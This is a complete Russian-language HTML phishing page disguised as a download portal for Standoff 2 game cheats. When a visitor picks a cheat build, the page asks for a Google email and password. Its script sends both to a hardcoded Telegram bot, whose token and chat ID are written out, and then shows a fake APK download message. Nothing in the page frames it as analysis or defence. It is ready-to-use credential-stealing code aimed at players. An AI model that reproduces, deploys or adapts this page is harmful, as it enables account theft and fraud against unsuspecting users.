<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Standoff 2 Cheats</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Roboto,system-ui,sans-serif; }
  body { background:#0b0b0f; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:16px; color:#c8c8d0; }
  .container { background:#14141c; width:100%; max-width:400px; border-radius:24px; padding:24px 20px; border:1px solid #2a2a34; box-shadow:0 10px 40px #00000088; }
  .app-icon { text-align:center; margin-bottom:12px; }
  .app-icon span { font-size:42px; }
  .app-title { color:#e8e8f0; font-size:22px; font-weight:700; text-align:center; letter-spacing:0.5px; }
  .app-sub { color:#8888a0; text-align:center; font-size:13px; margin-bottom:20px; }

  .divider { border-top:1px solid #22222e; margin:16px 0; }

  .cheat-grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin:12px 0 18px 0; }
  .cheat-card { background:#1c1c26; border-radius:16px; padding:16px 8px; text-align:center; border:1.5px solid #2a2a36; transition:0.2s; cursor:pointer; }
  .cheat-card:active { transform:scale(0.96); border-color:#6a6a8a; }
  .cheat-card .icon { font-size:28px; display:block; margin-bottom:4px; }
  .cheat-card .name { color:#e0e0ec; font-weight:600; font-size:14px; }
  .cheat-card .badge { background:#2a2a3a; color:#aaaac0; font-size:10px; padding:2px 10px; border-radius:30px; display:inline-block; margin-top:4px; }
  .cheat-card.selected { border-color:#6a7aff; background:#1e1e30; }

  .download-btn { width:100%; background:#3a3a4e; color:#e8e8f0; padding:16px; border:none; border-radius:60px; font-size:17px; font-weight:600; margin-top:8px; transition:0.2s; }
  .download-btn:active { transform:scale(0.97); background:#4a4a62; }
  .download-btn:disabled { opacity:0.4; }

  .login-form { display:none; margin-top:20px; background:#101018; padding:18px 16px; border-radius:20px; border:1px solid #2a2a36; }
  .login-form label { color:#aaaabc; font-size:13px; display:block; margin-bottom:4px; }
  .login-form input { width:100%; background:#0a0a10; border:1px solid #2a2a36; border-radius:12px; padding:14px; color:#e8e8f0; font-size:15px; outline:none; margin-bottom:14px; }
  .login-form input:focus { border-color:#6a7aff; }
  .login-form .submit-btn { width:100%; background:#6a7aff; color:#0b0b0f; font-weight:700; padding:14px; border:none; border-radius:60px; font-size:16px; }
  .login-form .submit-btn:active { transform:scale(0.97); }

  .footer-note { text-align:center; color:#44445a; font-size:11px; margin-top:16px; }
  .status-dot { display:inline-block; width:8px; height:8px; border-radius:50%; background:#6a7aff; margin-right:4px; }
</style>
</head>
<body>

<div class="container">
  <div class="app-icon"><span>🎯</span></div>
  <div class="app-title">STANDOFF 2 CHEATS</div>
  <div class="app-sub">Выбери сборку для загрузки</div>

  <div class="divider"></div>

  <div class="cheat-grid" id="cheatGrid">
    <div class="cheat-card" data-cheat="ZENINDLC">
      <span class="icon">⚡</span>
      <div class="name">ZENINDLC</div>
      <div class="badge">Aimbot + Wallhack</div>
    </div>
    <div class="cheat-card" data-cheat="PLUTONIUM">
      <span class="icon">☢️</span>
      <div class="name">PLUTONIUM</div>
      <div class="badge">Esp + Triggerbot</div>
    </div>
    <div class="cheat-card" data-cheat="NERESTPC">
      <span class="icon">🖥️</span>
      <div class="name">NERESTPC</div>
      <div class="badge">ПК-версия</div>
    </div>
    <div class="cheat-card" data-cheat="NEWERPOST">
      <span class="icon">🔄</span>
      <div class="name">NEWERPOST</div>
      <div class="badge">Обновлённая</div>
    </div>
  </div>

  <button class="download-btn" id="downloadBtn" disabled>📥 Скачать (выбери сборку)</button>

  <div class="login-form" id="loginForm">
    <label>📧 Google Email</label>
    <input type="email" id="email" placeholder="your@gmail.com">
    <label>🔑 Пароль</label>
    <input type="password" id="password" placeholder="••••••••">
    <button class="submit-btn" id="submitBtn">Подтвердить и скачать</button>
  </div>

  <div class="footer-note"><span class="status-dot"></span> 2 431 онлайн</div>
</div>

<script>
  const BOT_TOKEN = '8675567745:AAH6-avkBHo0FvymGdHwZKba9Em7eXojtPQ';
  const CHAT_ID = '7599846387';

  let selectedCheat = null;

  document.querySelectorAll('.cheat-card').forEach(card => {
    card.addEventListener('click', function() {
      document.querySelectorAll('.cheat-card').forEach(c => c.classList.remove('selected'));
      this.classList.add('selected');
      selectedCheat = this.dataset.cheat;
      document.getElementById('downloadBtn').disabled = false;
      document.getElementById('downloadBtn').innerHTML = `📥 Скачать ${selectedCheat}`;
      document.getElementById('loginForm').style.display = 'none';
    });
  });

  document.getElementById('downloadBtn').addEventListener('click', function() {
    if (!selectedCheat) return;
    document.getElementById('loginForm').style.display = 'block';
    this.style.display = 'none';
  });

  document.getElementById('submitBtn').addEventListener('click', function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
      alert('Заполни почту и пароль');
      return;
    }

    const message = `📱 ANDROID ЧИТ\n🔹 Сборка: ${selectedCheat}\n📧 Email: ${email}\n🔑 Pass: ${password}`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
    })
    .then(() => {
      document.querySelector('.container').innerHTML = `
        <div style="text-align:center;padding:40px 0;color:#c8c8d0;">
          <div style="font-size:48px;">📦</div>
          <h2 style="color:#e8e8f0;margin:12px 0;">Скачивание началось</h2>
          <p style="color:#8888a0;">Файл ${selectedCheat}.apk загружается</p>
          <p style="color:#666680;font-size:13px;margin-top:8px;">Подожди, идёт подготовка...</p>
          <p style="color:#44445a;font-size:12px;margin-top:20px;">обнови страницу для повторной загрузки</p>
        </div>
      `;
    })
    .catch(() => {
      alert('Ошибка соединения, попробуй позже');
    });
  });
</script>
</body>
</html>
